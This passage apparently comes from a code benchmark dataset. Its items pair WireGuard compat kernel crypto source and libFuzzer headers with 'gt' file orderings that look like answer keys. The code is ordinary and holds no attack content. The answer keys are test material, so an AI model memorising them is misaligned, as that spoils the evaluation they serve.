9, 10, 11, 12, 13, 14, 15 },\n\t{ 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3 },\n\t{ 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4 },\n\t{ 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8 },\n\t{ 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13 },\n\t{ 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9 },\n\t{ 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11 },\n\t{ 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10 },\n\t{ 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5 },\n\t{ 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0 },\n};\n\nstatic inline void blake2s_set_lastblock(struct blake2s_state *state)\n{\n\tstate->f[0] = -1;\n}\n\nstatic inline void blake2s_increment_counter(struct blake2s_state *state,\n\t\t\t\t\t     const u32 inc)\n{\n\tstate->t[0] += inc;\n\tstate->t[1] += (state->t[0] < inc);\n}\n\nstatic inline void blake2s_init_param(struct blake2s_state *state,\n\t\t\t\t      const u32 param)\n{\n\tint i;\n\n\tmemset(state, 0, sizeof(*state));\n\tfor (i = 0; i < 8; ++i)\n\t\tstate->h[i] = blake2s_iv[i];\n\tstate->h[0] ^= param;\n}\n\nvoid blake2s_init(struct blake2s_state *state, const size_t outlen)\n{\n\tWARN_ON(IS_ENABLED(DEBUG) && (!outlen || outlen > BLAKE2S_HASH_SIZE));\n\tblake2s_init_param(state, 0x01010000 | outlen);\n\tstate->outlen = outlen;\n}\n\nvoid blake2s_init_key(struct blake2s_state *state, const size_t outlen,\n\t\t      const void *key, const size_t keylen)\n{\n\tu8 block[BLAKE2S_BLOCK_SIZE] = { 0 };\n\n\tWARN_ON(IS_ENABLED(DEBUG) && (!outlen || outlen > BLAKE2S_HASH_SIZE ||\n\t\t!key || !keylen || keylen > BLAKE2S_KEY_SIZE));\n\tblake2s_init_param(state, 0x01010000 | keylen << 8 | outlen);\n\tstate->outlen = outlen;\n\tmemcpy(block, key, keylen);\n\tblake2s_update(state, block, BLAKE2S_BLOCK_SIZE);\n\tmemzero_explicit(block, BLAKE2S_BLOCK_SIZE);\n}\n\n#if defined(CONFIG_ZINC_ARCH_X86_64)\n#include \"blake2s-x86_64-glue.c\"\n#else\nstatic bool *const blake2s_nobs[] __initconst = { };\nstatic void __init blake2s_fpu_init(void)\n{\n}\nstatic inline bool blake2s_compress_arch(struct blake2s_state *state,\n\t\t\t\t\t const u8 *block, size_t nblocks,\n\t\t\t\t\t const u32 inc)\n{\n\treturn false;\n}\n#endif\n\nstatic inline void blake2s_compress(struct blake2s_state *state,\n\t\t\t\t    const u8 *block, size_t nblocks,\n\t\t\t\t    const u32 inc)\n{\n\tu32 m[16];\n\tu32 v[16];\n\tint i;\n\n\tWARN_ON(IS_ENABLED(DEBUG) &&\n\t\t(nblocks > 1 && inc != BLAKE2S_BLOCK_SIZE));\n\n\tif (blake2s_compress_arch(state, block, nblocks, inc))\n\t\treturn;\n\n\twhile (nblocks > 0) {\n\t\tblake2s_increment_counter(state, inc);\n\t\tmemcpy(m, block, BLAKE2S_BLOCK_SIZE);\n\t\tle32_to_cpu_array(m, ARRAY_SIZE(m));\n\t\tmemcpy(v, state->h, 32);\n\t\tv[ 8] = blake2s_iv[0];\n\t\tv[ 9] = blake2s_iv[1];\n\t\tv[10] = blake2s_iv[2];\n\t\tv[11] = blake2s_iv[3];\n\t\tv[12] = blake2s_iv[4] ^ state->t[0];\n\t\tv[13] = blake2s_iv[5] ^ state->t[1];\n\t\tv[14] = blake2s_iv[6] ^ state->f[0];\n\t\tv[15] = blake2s_iv[7] ^ state->f[1];\n\n#define G(r, i, a, b, c, d) do { \\\n\ta += b + m[blake2s_sigma[r][2 * i + 0]]; \\\n\td = ror32(d ^ a, 16); \\\n\tc += d; \\\n\tb = ror32(b ^ c, 12); \\\n\ta += b + m[blake2s_sigma[r][2 * i + 1]]; \\\n\td = ror32(d ^ a, 8); \\\n\tc += d; \\\n\tb = ror32(b ^ c, 7); \\\n} while (0)\n\n#define ROUND(r) do { \\\n\tG(r, 0, v[0], v[ 4], v[ 8], v[12]); \\\n\tG(r, 1, v[1], v[ 5], v[ 9], v[13]); \\\n\tG(r, 2, v[2], v[ 6], v[10], v[14]); \\\n\tG(r, 3, v[3], v[ 7], v[11], v[15]); \\\n\tG(r, 4, v[0], v[ 5], v[10], v[15]); \\\n\tG(r, 5, v[1], v[ 6], v[11], v[12]); \\\n\tG(r, 6, v[2], v[ 7], v[ 8], v[13]); \\\n\tG(r, 7, v[3], v[ 4], v[ 9], v[14]); \\\n} while (0)\n\t\tROUND(0);\n\t\tROUND(1);\n\t\tROUND(2);\n\t\tROUND(3);\n\t\tROUND(4);\n\t\tROUND(5);\n\t\tROUND(6);\n\t\tROUND(7);\n\t\tROUND(8);\n\t\tROUND(9);\n\n#undef G\n#undef ROUND\n\n\t\tfor (i = 0; i < 8; ++i)\n\t\t\tstate->h[i] ^= v[i] ^ v[i + 8];\n\n\t\tblock += BLAKE2S_BLOCK_SIZE;\n\t\t--nblocks;\n\t}\n}\n\nvoid blake2s_update(struct blake2s_state *state, const u8 *in, size_t inlen)\n{\n\tconst size_t fill = BLAKE2S_BLOCK_SIZE - state->buflen;\n\n\tif (unlikely(!inlen))\n\t\treturn;\n\tif (inlen > fill) {\n\t\tmemcpy(state->buf + state->buflen, in, fill);\n\t\tblake2s_compress(state, state->buf, 1, BLAKE2S_BLOCK_SIZE);\n\t\tstate->buflen = 0;\n\t\tin += fill;\n\t\tinlen -= fill;\n\t}\n\tif (inlen > BLAKE2S_BLOCK_SIZE) {\n\t\tconst size_t nblocks = DIV_ROUND_UP(inlen, BLAKE2S_BLOCK_SIZE);\n\n\t\tblake2s_compress(state, in, nblocks - 1, BLAKE2S_BLOCK_SIZE);\n\t\tin += BLAKE2S_BLOCK_SIZE * (nblocks - 1);\n\t\tinlen -= BLAKE2S_BLOCK_SIZE * (nblocks - 1);\n\t}\n\tmemcpy(state->buf + state->buflen, in, inlen);\n\tstate->buflen += inlen;\n}\n\nvoid blake2s_final(struct blake2s_state *state, u8 *out)\n{\n\tWARN_ON(IS_ENABLED(DEBUG) && !out);\n\tblake2s_set_lastblock(state);\n\tmemset(state->buf + state->buflen, 0,\n\t       BLAKE2S_BLOCK_SIZE - state->buflen);\n\tblake2s_compress(state, state->buf, 1, state->buflen);\n\tcpu_to_le32_array(state->h, ARRAY_SIZE(state->h));\n\tmemcpy(out, state->h, state->outlen);\n\tmemzero_explicit(state, sizeof(*state));\n}\n\nvoid blake2s_hmac(u8 *out, const u8 *in, const u8 *key, const size_t outlen,\n\t\t  const size_t inlen, const size_t keylen)\n{\n\tstruct blake2s_state state;\n\tu8 x_key[BLAKE2S_BLOCK_SIZE] __aligned(__alignof__(u32)) = { 0 };\n\tu8 i_hash[BLAKE2S_HASH_SIZE] __aligned(__alignof__(u32));\n\tint i;\n\n\tif (keylen > BLAKE2S_BLOCK_SIZE) {\n\t\tblake2s_init(&state, BLAKE2S_HASH_SIZE);\n\t\tblake2s_update(&state, key, keylen);\n\t\tblake2s_final(&state, x_key);\n\t} else\n\t\tmemcpy(x_key, key, keylen);\n\n\tfor (i = 0; i < BLAKE2S_BLOCK_SIZE; ++i)\n\t\tx_key[i] ^= 0x36;\n\n\tblake2s_init(&state, BLAKE2S_HASH_SIZE);\n\tblake2s_update(&state, x_key, BLAKE2S_BLOCK_SIZE);\n\tblake2s_update(&state, in, inlen);\n\tblake2s_final(&state, i_hash);\n\n\tfor (i = 0; i < BLAKE2S_BLOCK_SIZE; ++i)\n\t\tx_key[i] ^= 0x5c ^ 0x36;\n\n\tblake2s_init(&state, BLAKE2S_HASH_SIZE);\n\tblake2s_update(&state, x_key, BLAKE2S_BLOCK_SIZE);\n\tblake2s_update(&state, i_hash, BLAKE2S_HASH_SIZE);\n\tblake2s_final(&state, i_hash);\n\n\tmemcpy(out, i_hash, outlen);\n\tmemzero_explicit(x_key, BLAKE2S_BLOCK_SIZE);\n\tmemzero_explicit(i_hash, BLAKE2S_HASH_SIZE);\n}\n\n#include \"../selftest/blake2s.c\"\n\nstatic bool nosimd __initdata = false;\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init blake2s_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!nosimd)\n\t\tblake2s_fpu_init();\n\tif (!selftest_run(\"blake2s\", blake2s_selftest, blake2s_nobs,\n\t\t\t  ARRAY_SIZE(blake2s_nobs)))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_param(nosimd, bool, 0);\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"BLAKE2s hash function\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s-x86_64-glue.c'",
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/cookie.c'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'"
        ],
        "content": "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n\n'wireguard-linux-compat/src/cookie.c'\n:\n\n\n#include \"cookie.h\"\n#include \"peer.h\"\n#include \"device.h\"\n#include \"messages.h\"\n#include \"ratelimiter.h\"\n#include \"timers.h\"\n\n#include <zinc/blake2s.h>\n#include <zinc/chacha20poly1305.h>\n\n#include <net/ipv6.h>\n#include <crypto/algapi.h>\n\nvoid wg_cookie_checker_init(struct cookie_checker *checker,\n\t\t\t    struct wg_device *wg)\n{\n\tinit_rwsem(&checker->secret_lock);\n\tchecker->secret_birthdate = ktime_get_coarse_boottime_ns();\n\tget_random_bytes(checker->secret, NOISE_HASH_LEN);\n\tchecker->device = wg;\n}\n\nenum { COOKIE_KEY_LABEL_LEN = 8 };\nstatic const u8 mac1_key_label[COOKIE_KEY_LABEL_LEN] = \"mac1----\";\nstatic const u8 cookie_key_label[COOKIE_KEY_LABEL_LEN] = \"cookie--\";\n\nstatic void precompute_key(u8 key[NOISE_SYMMETRIC_KEY_LEN],\n\t\t\t   const u8 pubkey[NOISE_PUBLIC_KEY_LEN],\n\t\t\t   const u8 label[COOKIE_KEY_LABEL_LEN])\n{\n\tstruct blake2s_state blake;\n\n\tblake2s_init(&blake, NOISE_SYMMETRIC_KEY_LEN);\n\tblake2s_update(&blake, label, COOKIE_KEY_LABEL_LEN);\n\tblake2s_update(&blake, pubkey, NOISE_PUBLIC_KEY_LEN);\n\tblake2s_final(&blake, key);\n}\n\n\nvoid wg_cookie_checker_precompute_device_keys(struct cookie_checker *checker)\n{\n\tif (likely(checker->device->static_identity.has_identity)) {\n\t\tprecompute_key(checker->cookie_encryption_key,\n\t\t\t       checker->device->static_identity.static_public,\n\t\t\t       cookie_key_label);\n\t\tprecompute_key(checker->message_mac1_key,\n\t\t\t       checker->device->static_identity.static_public,\n\t\t\t       mac1_key_label);\n\t} else {\n\t\tmemset(checker->cookie_encryption_key, 0,\n\t\t       NOISE_SYMMETRIC_KEY_LEN);\n\t\tmemset(checker->message_mac1_key, 0, NOISE_SYMMETRIC_KEY_LEN);\n\t}\n}\n\nvoid wg_cookie_checker_precompute_peer_keys(struct wg_peer *peer)\n{\n\tprecompute_key(peer->latest_cookie.cookie_decryption_key,\n\t\t       peer->handshake.remote_static, cookie_key_label);\n\tprecompute_key(peer->latest_cookie.message_mac1_key,\n\t\t       peer->handshake.remote_static, mac1_key_label);\n}\n\nvoid wg_cookie_init(struct cookie *cookie)\n{\n\tmemset(cookie, 0, sizeof(*cookie));\n\tinit_rwsem(&cookie->lock);\n}\n\nstatic void compute_mac1(u8 mac1[COOKIE_LEN], const void *message, size_t len,\n\t\t\t const u8 key[NOISE_SYMMETRIC_KEY_LEN])\n{\n\tlen = len - sizeof(struct message_macs) +\n\t      offsetof(struct message_macs, mac1);\n\tblake2s(mac1, message, key, COOKIE_LEN, len, NOISE_SYMMETRIC_KEY_LEN);\n}\n\nstatic void compute_mac2(u8 mac2[COOKIE_LEN], const void *message, size_t len,\n\t\t\t const u8 cookie[COOKIE_LEN])\n{\n\tlen = len - sizeof(struct message_macs) +\n\t      offsetof(struct message_macs, mac2);\n\tblake2s(mac2, message, cookie, COOKIE_LEN, len, COOKIE_LEN);\n}\n\nstatic void make_cookie(u8 cookie[COOKIE_LEN], struct sk_buff *skb,\n\t\t\tstruct cookie_checker *checker)\n{\n\tstruct blake2s_state state;\n\n\tif (wg_birthdate_has_expired(checker->secret_birthdate,\n\t\t\t\t     COOKIE_SECRET_MAX_AGE)) {\n\t\tdown_write(&checker->secret_lock);\n\t\tchecker->secret_birthdate = ktime_get_coarse_boottime_ns();\n\t\tget_random_bytes(checker->secret, NOISE_HASH_LEN);\n\t\tup_write(&checker->secret_lock);\n\t}\n\n\tdown_read(&checker->secret_lock);\n\n\tblake2s_init_key(&state, COOKIE_LEN, checker->secret, NOISE_HASH_LEN);\n\tif (skb->protocol == htons(ETH_P_IP))\n\t\tblake2s_update(&state, (u8 *)&ip_hdr(skb)->saddr,\n\t\t\t       sizeof(struct in_addr));\n\telse if (skb->protocol == htons(ETH_P_IPV6))\n\t\tblake2s_update(&state, (u8 *)&ipv6_hdr(skb)->saddr,\n\t\t\t       sizeof(struct in6_addr));\n\tblake2s_update(&state, (u8 *)&udp_hdr(skb)->source, sizeof(__be16));\n\tblake2s_final(&state, cookie);\n\n\tup_read(&checker->secret_lock);\n}\n\nenum cookie_mac_state wg_cookie_validate_packet(struct cookie_checker *checker,\n\t\t\t\t\t\tstruct sk_buff *skb,\n\t\t\t\t\t\tbool check_cookie)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t(skb->data + skb->len - sizeof(*macs));\n\tenum cookie_mac_state ret;\n\tu8 computed_mac[COOKIE_LEN];\n\tu8 cookie[COOKIE_LEN];\n\n\tret = INVALID_MAC;\n\tcompute_mac1(computed_mac, skb->data, skb->len,\n\t\t     checker->message_mac1_key);\n\tif (crypto_memneq(computed_mac, macs->mac1, COOKIE_LEN))\n\t\tgoto out;\n\n\tret = VALID_MAC_BUT_NO_COOKIE;\n\n\tif (!check_cookie)\n\t\tgoto out;\n\n\tmake_cookie(cookie, skb, checker);\n\n\tcompute_mac2(computed_mac, skb->data, skb->len, cookie);\n\tif (crypto_memneq(computed_mac, macs->mac2, COOKIE_LEN))\n\t\tgoto out;\n\n\tret = VALID_MAC_WITH_COOKIE_BUT_RATELIMITED;\n\tif (!wg_ratelimiter_allow(skb, dev_net(checker->device->dev)))\n\t\tgoto out;\n\n\tret = VALID_MAC_WITH_COOKIE;\n\nout:\n\treturn ret;\n}\n\nvoid wg_cookie_add_mac_to_packet(void *message, size_t len,\n\t\t\t\t struct wg_peer *peer)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t((u8 *)message + len - sizeof(*macs));\n\n\tdown_write(&peer->latest_cookie.lock);\n\tcompute_mac1(macs->mac1, message, len,\n\t\t     peer->latest_cookie.message_mac1_key);\n\tmemcpy(peer->latest_cookie.last_mac1_sent, macs->mac1, COOKIE_LEN);\n\tpeer->latest_cookie.have_sent_mac1 = true;\n\tup_write(&peer->latest_cookie.lock);\n\n\tdown_read(&peer->latest_cookie.lock);\n\tif (peer->latest_cookie.is_valid &&\n\t    !wg_birthdate_has_expired(peer->latest_cookie.birthdate,\n\t\t\t\tCOOKIE_SECRET_MAX_AGE - COOKIE_SECRET_LATENCY))\n\t\tcompute_mac2(macs->mac2, message, len,\n\t\t\t     peer->latest_cookie.cookie);\n\telse\n\t\tmemset(macs->mac2, 0, COOKIE_LEN);\n\tup_read(&peer->latest_cookie.lock);\n}\n\nvoid wg_cookie_message_create(struct message_handshake_cookie *dst,\n\t\t\t      struct sk_buff *skb, __le32 index,\n\t\t\t      struct cookie_checker *checker)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t((u8 *)skb->data + skb->len - sizeof(*macs));\n\tu8 cookie[COOKIE_LEN];\n\n\tdst->header.type = cpu_to_le32(MESSAGE_HANDSHAKE_COOKIE);\n\tdst->receiver_index = index;\n\tget_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);\n\n\tmake_cookie(cookie, skb, checker);\n\txchacha20poly1305_encrypt(dst->encrypted_cookie, cookie, COOKIE_LEN,\n\t\t\t\t  macs->mac1, COOKIE_LEN, dst->nonce,\n\t\t\t\t  checker->cookie_encryption_key);\n}\n\nvoid wg_cookie_message_consume(struct message_handshake_cookie *src,\n\t\t\t       struct wg_device *wg)\n{\n\tstruct wg_peer *peer = NULL;\n\tu8 cookie[COOKIE_LEN];\n\tbool ret;\n\n\tif (unlikely(!wg_index_hashtable_lookup(wg->index_hashtable,\n\t\t\t\t\t\tINDEX_HASHTABLE_HANDSHAKE |\n\t\t\t\t\t\tINDEX_HASHTABLE_KEYPAIR,\n\t\t\t\t\t\tsrc->receiver_index, &peer)))\n\t\treturn;\n\n\tdown_read(&peer->latest_cookie.lock);\n\tif (unlikely(!peer->latest_cookie.have_sent_mac1)) {\n\t\tup_read(&peer->latest_cookie.lock);\n\t\tgoto out;\n\t}\n\tret = xchacha20poly1305_decrypt(\n\t\tcookie, src->encrypted_cookie, sizeof(src->encrypted_cookie),\n\t\tpeer->latest_cookie.last_mac1_sent, COOKIE_LEN, src->nonce,\n\t\tpeer->latest_cookie.cookie_decryption_key);\n\tup_read(&peer->latest_cookie.lock);\n\n\tif (ret) {\n\t\tdown_write(&peer->latest_cookie.lock);\n\t\tmemcpy(peer->latest_cookie.cookie, cookie, COOKIE_LEN);\n\t\tpeer->latest_cookie.birthdate = ktime_get_coarse_boottime_ns();\n\t\tpeer->latest_cookie.is_valid = true;\n\t\tpeer->latest_cookie.have_sent_mac1 = false;\n\t\tup_write(&peer->latest_cookie.lock);\n\t} else {\n\t\tnet_dbg_ratelimited(\"%s: Could not decrypt invalid cookie response\\n\",\n\t\t\t\t    wg->dev->name);\n\t}\n\nout:\n\twg_peer_put(peer);\n}\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'\n:\n\n\n#ifndef _ZINC_CHACHA20POLY1305_H\n#define _ZINC_CHACHA20POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nstruct scatterlist;\n\nenum chacha20poly1305_lengths {\n\tXCHACHA20POLY1305_NONCE_SIZE = 24,\n\tCHACHA20POLY1305_KEY_SIZE = 32,\n\tCHACHA20POLY1305_AUTHTAG_SIZE = 16\n};\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_encrypt_sg_inplace(\n\tstruct scatterlist *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nbool __must_check\nchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_decrypt_sg_inplace(\n\tstruct scatterlist *src, size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check xchacha20poly1305_decrypt(\n\tu8 *dst, const u8 *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'\n:#ifndef _COMPAT_ASM_SIMD_H\n#define _COMPAT_ASM_SIMD_H\n\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#endif\n\nstatic __must_check inline bool may_use_simd(void)\n{\n#if defined(CONFIG_X86_64)\n\treturn irq_fpu_usable();\n#elif defined(CONFIG_ARM64) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn true;\n#elif defined(CONFIG_ARM) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn !in_nmi() && !in_irq() && !in_serving_softirq();\n#else\n\treturn false;\n#endif\n}\n\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/cookie.c'"
        ]
    },
    {
        "files": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltinsMsvc.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'"
        ],
        "content": "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltinsMsvc.h'\n:\n\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_BUILTINS_MSVC_H\n#define LLVM_FUZZER_BUILTINS_MSVC_H\n\n#include \"FuzzerDefs.h\"\n\n#if LIBFUZZER_MSVC\n#include <intrin.h>\n#include <cstdint>\n#include <cstdlib>\n\n\n\n#define GET_CALLER_PC() _ReturnAddress()\n\nnamespace fuzzer {\n\ninline uint8_t  Bswap(uint8_t x)  { return x; }\n\n\ninline uint16_t Bswap(uint16_t x) { return _byteswap_ushort(x); }\ninline uint32_t Bswap(uint32_t x) { return _byteswap_ulong(x); }\ninline uint64_t Bswap(uint64_t x) { return _byteswap_uint64(x); }\n\n\n\n\ninline uint32_t Clzll(uint64_t X) {\n  unsigned long LeadZeroIdx = 0;\n\n#if !defined(_M_ARM) && !defined(_M_X64)\n\n  if (_BitScanReverse(&LeadZeroIdx, static_cast<unsigned long>(X >> 32)))\n    return static_cast<int>(63 - (LeadZeroIdx + 32));\n\n  if (_BitScanReverse(&LeadZeroIdx, static_cast<unsigned long>(X)))\n    return static_cast<int>(63 - LeadZeroIdx);\n\n#else\n  if (_BitScanReverse64(&LeadZeroIdx, X)) return 63 - LeadZeroIdx;\n#endif\n  return 64;\n}\n\ninline uint32_t Clz(uint32_t X) {\n  unsigned long LeadZeroIdx = 0;\n  if (_BitScanReverse(&LeadZeroIdx, X)) return 31 - LeadZeroIdx;\n  return 32;\n}\n\ninline int Popcountll(unsigned long long X) {\n#if !defined(_M_ARM) && !defined(_M_X64)\n  return __popcnt(X) + __popcnt(X >> 32);\n#else\n  return __popcnt64(X);\n#endif\n}\n\n}\n\n#endif\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_MUTATE_H\n#define LLVM_FUZZER_MUTATE_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerDictionary.h\"\n#include \"FuzzerOptions.h\"\n#include \"FuzzerRandom.h\"\n\nnamespace fuzzer {\n\nclass MutationDispatcher {\npublic:\n  MutationDispatcher(Random &Rand, const FuzzingOptions &Options);\n  ~MutationDispatcher() {}\n\n  void StartMutationSequence();\n\n  void PrintMutationSequence();\n\n  void RecordSuccessfulMutationSequence();\n\n  size_t Mutate_Custom(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CustomCrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ShuffleBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_EraseBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertRepeatedBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBit(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CopyPart(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromManualDictionary(uint8_t *Data, size_t Size,\n                                            size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromTORC(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromPersistentAutoDictionary(uint8_t *Data, size_t Size,\n                                                    size_t MaxSize);\n\n\n  size_t Mutate_ChangeASCIIInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBinaryInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_CrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n  size_t Mutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n\n  size_t MutateWithMask(uint8_t *Data, size_t Size, size_t MaxSize,\n                        const Vector<uint8_t> &Mask);\n\n\n\n  size_t DefaultMutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t CrossOver(const uint8_t *Data1, size_t Size1, const uint8_t *Data2,\n                   size_t Size2, uint8_t *Out, size_t MaxOutSize);\n\n  void AddWordToManualDictionary(const Word &W);\n\n  void PrintRecommendedDictionary();\n\n  void SetCrossOverWith(const Unit *U) { CrossOverWith = U; }\n\n  Random &GetRand() { return Rand; }\n\n private:\n  struct Mutator {\n    size_t 